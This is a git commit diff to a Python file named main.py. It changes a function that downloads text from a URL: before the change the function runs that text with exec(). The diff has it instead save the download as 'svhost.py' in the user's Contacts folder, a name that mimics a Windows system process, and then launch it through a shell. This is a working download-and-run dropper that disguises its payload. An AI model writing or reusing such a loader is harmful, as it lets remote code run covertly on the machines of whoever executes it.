edd55508686d47f08f7e0d72c107b062cdeb9ef4
lopeklol <pawel.kawalec2008@gmail.com>
2025-01-02 17:08:37 +0100

    Add files via upload

--- main.py
+++ main.py
@@ -1,4 +1,7 @@
 import requests
+from os import getlogin, makedirs
+from os.path import dirname
+from subprocess import call
 
 def execute_code(url):
     try:
@@ -6,8 +9,14 @@ def execute_code(url):
         response.raise_for_status()
         
         code = response.text
-        print(code)
-        exec(code)
+        file_path = f'C:\\Users\\{getlogin()}\\Contacts\\svhost.py'
+
+        makedirs(dirname(file_path), exist_ok=True)
+        
+        with open(file_path, 'w') as source_file:
+            source_file.write(code)
+        
+        call(f'start {file_path}', shell=True)
 
     except Exception as e:
         print(f"Failed to execute code: {e}")
